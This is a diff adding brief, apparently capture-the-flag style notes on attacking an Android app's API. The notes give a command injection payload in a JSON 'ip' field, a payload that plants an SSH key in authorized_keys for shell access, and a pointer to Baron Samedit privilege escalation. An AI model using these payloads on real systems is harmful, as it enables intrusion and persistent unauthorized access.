@@ -1,0 +1,31 @@
+------------------
+NOTES
+------------------
+
+------------------
+PROCESS
+------------------
+Got the apk working finally
+	install anbox
+	install the apk (adb install <apk file name>)
+	anbox.appmgr launches the gui
+
+Edit the /etc/hosts of the andriod img
+
+The app is making requests to an api endpoint that replies back with the ip
+
+{"ip":"0.0.0.0"} = "0.0.0.0\n"
+
+command injection can be passed in to the ip var in json
+
+{"ip":"0.0.0.0;id"} = "0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
+
+to get a shell:
+	add ssh key to the authorized keys
+{
+	"ip":"0.0.0.0; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs/aG8az+UTj5ZBFalUJwAEzl+gDkqG79sZRbAGxfl8Z6DgkqPsdMH81Fmp4tzoK1iAsg1CAILIVmKU4inrE4VSJ6ZEC/nB53qzapIpAyIA/QU86T+phfr3SsOtnacZ9gjfa4gDBCIXtbslHO1/ZFGeAygIhIvl4C2Q8vxkbpr9L7URD+pzrdlGkKpi5603YfFtFnYkSbBWq0wcJzwLukTa5SXnWnlOnSzNNY2BylJ4F7gZCTF7eGzFXQuPp3KEzcuWwdSm79GsFAXLSrV2x5OFGXGEuYjNnXaTmxwXTpyFzNLAqgZpSkvS3NjQx1wmFSFW2I46tKmdw0zjY2GGfjqPau+xP0Gz6ONTqdpqcR2WUWjoBD+EcolMUGo2ef0DK3rlVNc4ABqZzg0+2wEYc61o+IVmRvstYsfRMP4dQn2eWhyTHIRulri1iwQpI12KeHiSXP0xKlTSXwnj6xrAXDpjt+sYOYvS/0W7zjj6HK/21hWvCPxZasdgrQdTBcEAWU=' >> /home/paul/.ssh/authorized_keys"
+}
+
+ssh paul@ip -i id_rsa
+
+priv esc is very easy, sudo baron samedit cve and poc workds easily
